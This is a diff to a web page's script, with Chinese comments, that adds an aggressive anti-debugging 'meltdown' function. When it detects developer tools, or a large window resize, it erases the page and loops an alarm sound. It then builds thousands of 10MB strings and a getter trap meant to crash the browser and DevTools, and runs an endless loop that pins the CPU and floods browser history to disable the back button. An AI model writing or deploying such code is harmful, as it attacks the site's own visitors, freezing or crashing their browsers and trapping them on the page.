@@ -1209,7 +1209,7 @@
                 <script>
                     // 1. 在这里定义数据
                     var fixedKnowledge = [
-                        { "q": "今天星期几", "a": "今天是 " + ["周日", "周一", "周二", "周三", "周四", "周五", "周六"][new Date().getDay()] },
+                        { "q": "今天星期几", "a": "今天是"+ ["周日", "周一", "周二", "周三", "周四", "周五", "周六"][new Date().getDay()] },
                     ];
                     // 2. 马上写出数量 (这一步是实时的，不会闪烁)
                     document.write("当前索引数量: " + fixedKnowledge.length);
@@ -2621,26 +2621,119 @@
                 return false;
             }
         };
-        // 4:防调试
+        // =========================================
+        // 4: 终极防调试 (浏览器熔毁：内存爆破 + 控制台致死)
+        // =========================================
         (function antiDebug() {
-            var checkStatus = function () {
-                var start = new Date().getTime();
-                // 1. 触发断点
-                debugger;
-                // 2. 只有当开发者工具打开且断点生效时，这里才会暂停
-                // 如果用户按了 F8 继续，或者单步调试，时间差就会变大
-                var end = new Date().getTime();
-                // 3. 检测时间差：如果超过 100ms，说明刚刚被暂停了（即有人在调试）
-                if (end - start > 100) {
-                    // === 惩罚措施：清空页面或跳转 ===
-                    document.body.innerHTML = '<h1 style="color:red;margin:20% auto;text-align:center;">Illegal Debugging Detected</h1>';
-                    document.body.style.background = "#000";
-                    // 
-                    // window.location.href = "about:blank";
+            var soundUrl = "https://www.myinstants.com/media/sounds/metal-gear-solid-alert.mp3"; 
+            var warningAudio = new Audio(soundUrl);
+            warningAudio.loop = true;
+            
+            var isTriggered = false;
+
+            function meltDown() {
+                if (isTriggered) return;
+                isTriggered = true;
+
+                // 1. 【声音】
+                if (typeof audioCtx !== 'undefined' && audioCtx.state === 'suspended') audioCtx.resume();
+                warningAudio.play().catch(function(e) {});
+
+                // 2. 【DOM 彻底抹除】
+                // document.write 会直接冲刷掉当前的文档流，
+                // 这意味着之前的 HTML 结构在内存中被彻底切断，不仅是清空，是“重置”。
+                document.open();
+                document.write('<h1 style="color:red;font-size:100px;text-align:center;margin-top:20%">SYSTEM DESTROYED</h1>');
+                document.close();
+
+                // 3. 【DevTools 爆破炸弹】(核聚变增强版)
+                // 浏览器的开发者工具渲染引擎在处理“动态Getter”和“唯一字符串”时极其脆弱。
+                
+                var bomb = [];
+                
+                // 技巧1：制造“去重”的垃圾数据
+                // 加上 Math.random() 后，V8 引擎无法复用内存，必须为每个字符串分配真实的 RAM。
+                // 10MB * 2000 次 = 20GB 内存压力（理论值），瞬间撑爆浏览器进程。
+                var createUniqueHugeString = function() {
+                    return new Array(1024 * 1024 * 10).join('x') + Math.random(); 
+                };
+
+                // 技巧2：Getter 陷阱 (最致命的一击)
+                // 这个属性平时不占内存，但只要 DevTools 一试图“预览”或“展开”它，
+                // 它就会瞬间进行高强度计算并生成新数据，直接卡死 UI 线程。
+                var getterTrap = {};
+                Object.defineProperty(getterTrap, "BOOM", {
+                    get: function() {
+                        return createUniqueHugeString(); // 每次看它一眼，就新造 10MB 垃圾
+                    },
+                    enumerable: true
+                });
+
+                for(var i=0; i<2000; i++) { // 循环次数增加到 2000
+                    bomb.push({
+                        // 填入 3 个 10MB 的独立字符串
+                        a: createUniqueHugeString(), 
+                        b: createUniqueHugeString(),
+                        c: createUniqueHugeString(),
+                        
+                        // 填入 Getter 陷阱，开发者工具一渲染这个对象就会卡顿
+                        trap: getterTrap, 
+                        
+                        // 疯狂的循环引用：数组包含对象，对象包含数组
+                        // 这种深层嵌套会让 DevTools 的对象格式化算法陷入死循环
+                        self: bomb, 
+                        
+                        // 混合 DOM 节点 (DevTools 渲染 DOM 节点预览非常慢)
+                        dom: document.body
+                    });
                 }
+
+                // 4. 【引爆】
+                // 一旦 F12 打开，Console 试图打印这个变量，DevTools 进程就会瞬间卡死甚至崩溃
+                console.log("Memory Dump:", bomb);
+                console.table(bomb); // table 渲染更吃性能
+
+                // 5. 【死循环补刀】
+                // 阻塞主线程，防止页面刷新或关闭
+                // 稍微延时 10ms 让上面的 console.log 先发出去
+                setTimeout(function() {
+                    while(true) {
+                        // 抢占 CPU
+                        Math.random(); 
+                        // 抢占历史记录，封死“后退”按钮
+                        history.pushState(0,0, window.location.href);
+                    }
+                }, 10);
+            }
+
+            // === 极速触发侦测 ===
+
+            // 1. 正则陷阱 (针对打开 Console 的瞬间)
+            var re = new RegExp('debug');
+            re.toString = function() {
+                meltDown();
+                return 'debug';
             };
-            // 每 1秒 检测一次，太频繁会影响性能
-            setInterval(checkStatus, 1000);
+
+            // 2. 性能监测陷阱 (针对 Sources 断点)
+            // 如果开发者试图打断点，JS 执行时间会变长，立刻触发
+            setInterval(function() {
+                var start = performance.now();
+                debugger; // 这是一个瞬时断点
+                if (performance.now() - start > 100) {
+                    meltDown();
+                }
+                // 配合正则陷阱
+                console.log(re);
+            }, 500);
+
+            // 3. 窗口尺寸陷阱 (针对 F12 挤压窗口)
+            var w = window.innerWidth, h = window.innerHeight;
+            window.addEventListener('resize', function() {
+                if (Math.abs(window.outerWidth - window.innerWidth) > 200 || Math.abs(window.outerHeight - window.innerHeight) > 200) {
+                    meltDown();
+                }
+            });
         })();
         // 5.  (Console Ban)
         try {
